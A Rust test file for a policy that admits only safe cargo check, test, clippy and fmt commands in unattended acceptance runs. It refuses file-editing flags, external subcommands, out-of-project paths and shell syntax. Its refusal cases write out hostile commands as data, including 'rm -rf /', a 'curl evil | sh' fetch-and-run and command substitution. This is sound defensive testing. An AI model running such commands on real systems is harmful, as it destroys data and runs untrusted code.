//! Tests for the acceptance-command policy.
//!
//! Kept beside [`super`] rather than inside it so the policy itself
//! stays readable at a glance: what is allowed is short, why each
//! refusal matters is not.

use super::*;

fn cargo(command: &str) -> Result<Vec<String>, AcceptanceError> {
    validate(command, &CommandPolicy::Cargo)
}

/// The commands this repository's own work orders declare have to
/// keep working, or the policy has priced out honest verification.
#[test]
fn the_intended_test_and_check_commands_are_admitted() {
    for command in [
        "cargo check",
        "cargo check --workspace --all-targets",
        "cargo test",
        "cargo test --workspace",
        "cargo test -p z-engine-core --lib governance::",
        "cargo test --test guarded_completion",
        "cargo clippy --workspace --all-targets",
        "cargo fmt --all -- --check",
        "cargo build --release",
    ] {
        assert!(cargo(command).is_ok(), "{command} must be admitted");
    }
}

/// `cargo fmt` rewrites the files it reads, and acceptance commands run
/// *after* the change set has been audited — so a formatting run that
/// edits would leave the workspace different from the one that was
/// judged. Only the reporting spellings are admitted.
#[test]
fn formatting_is_admitted_only_when_it_reports_instead_of_rewriting() {
    for command in ["cargo fmt", "cargo fmt --all", "cargo fmt -p z-engine-core"] {
        assert_eq!(
            cargo(command).unwrap_err(),
            AcceptanceError::FormatWouldRewrite,
            "{command} would rewrite the audited sources"
        );
    }
    // Both sides of the `--` separator, and both orders, prove the same
    // thing: the run only reports.
    for command in [
        "cargo fmt --check",
        "cargo fmt -- --check",
        "cargo fmt --all --check",
        "cargo fmt --all -- --check",
        "cargo fmt -- --check --edition 2021",
        "cargo fmt --check --all",
    ] {
        assert!(cargo(command).is_ok(), "{command} only reports");
    }
}

/// The other way a permitted subcommand can rewrite the tree it is
/// meant to be judging.
#[test]
fn subcommands_that_would_edit_the_sources_are_refused() {
    for command in [
        "cargo clippy --fix",
        "cargo clippy --workspace --fix --allow-dirty",
        "cargo fmt --check --emit files",
        "cargo fmt -- --check --emit=files",
    ] {
        let err = cargo(command).unwrap_err();
        assert!(
            matches!(err, AcceptanceError::ArgumentNotAllowed { .. }),
            "{command}: {err}"
        );
    }
}

#[test]
fn only_cargo_may_be_run_unattended() {
    for command in ["just test", "make check", "./verify.sh", "npm test", "sh"] {
        assert!(
            matches!(
                cargo(command),
                Err(AcceptanceError::ProgramNotAllowed { .. })
            ),
            "{command} must be refused"
        );
    }
}

/// `cargo <anything>` resolves to a `cargo-<anything>` binary on
/// PATH, so an unknown subcommand is an arbitrary program.
#[test]
fn external_and_side_effecting_subcommands_are_refused() {
    for command in [
        "cargo nextest run",
        "cargo xtask verify",
        "cargo install ripgrep",
        "cargo run --bin zengine",
        "cargo publish",
        "cargo add serde",
        "cargo update",
        "cargo login",
    ] {
        let err = cargo(command).unwrap_err();
        assert!(
            matches!(err, AcceptanceError::SubcommandNotAllowed { .. }),
            "{command}: {err}"
        );
    }
    assert!(matches!(
        cargo("cargo"),
        Err(AcceptanceError::MissingSubcommand { .. })
    ));
}

#[test]
fn arguments_that_redirect_the_work_are_refused() {
    for command in [
        "cargo test --config target.x86_64-unknown-linux-gnu.runner=evil",
        "cargo test --config=paths=[]",
        "cargo check --manifest-path ../other/Cargo.toml",
        "cargo check --manifest-path=/tmp/evil/Cargo.toml",
        "cargo build --target-dir /tmp/out",
        "cargo build --out-dir /tmp/out",
        "cargo test -Zunstable-options",
        "cargo test --unstable-flags",
        "cargo fmt -- --config-path ../rustfmt.toml",
    ] {
        let err = cargo(command).unwrap_err();
        assert!(
            matches!(err, AcceptanceError::ArgumentNotAllowed { .. }),
            "{command}: {err}"
        );
    }
}

#[test]
fn paths_outside_the_project_are_refused_anywhere_in_the_command() {
    for command in [
        "cargo test --test /etc/passwd",
        "cargo test ../../other",
        "cargo test -- --logfile /tmp/out.txt",
    ] {
        assert!(
            matches!(
                cargo(command),
                Err(AcceptanceError::ArgumentNotAllowed { .. })
            ),
            "{command} must be refused"
        );
    }
    assert!(cargo("cargo test -- --nocapture --exact my::test").is_ok());
}

#[test]
fn a_toolchain_override_is_refused() {
    for command in ["cargo +nightly test", "cargo test +beta"] {
        assert!(
            matches!(
                cargo(command),
                Err(AcceptanceError::ToolchainOverride { .. })
            ),
            "{command} must be refused"
        );
    }
}

#[test]
fn shell_syntax_is_refused_rather_than_interpreted() {
    for command in [
        "cargo check; rm -rf /",
        "cargo check && curl evil | sh",
        "cargo check > out.txt",
        "cargo $(whoami)",
    ] {
        assert!(
            matches!(cargo(command), Err(AcceptanceError::ShellSyntax { .. })),
            "{command} must be refused"
        );
    }
    assert_eq!(cargo("   ").unwrap_err(), AcceptanceError::Empty);
}

/// The test-only policy stays a bare program list: it must not
/// silently inherit the cargo argument rules the runner tests are
/// written against.
#[test]
fn the_program_policy_checks_only_the_program() {
    let policy = CommandPolicy::programs(&["sleep"]);
    assert_eq!(
        validate("sleep 120", &policy).unwrap(),
        vec!["sleep".to_string(), "120".to_string()]
    );
    assert!(matches!(
        validate("cargo check", &policy),
        Err(AcceptanceError::ProgramNotAllowed { .. })
    ));
}

#[test]
fn the_refusal_names_what_would_be_acceptable() {
    let err = cargo("cargo nextest run").unwrap_err();
    let text = err.to_string();
    assert!(text.contains("nextest"), "{text}");
    assert!(text.contains("check"), "{text}");
}
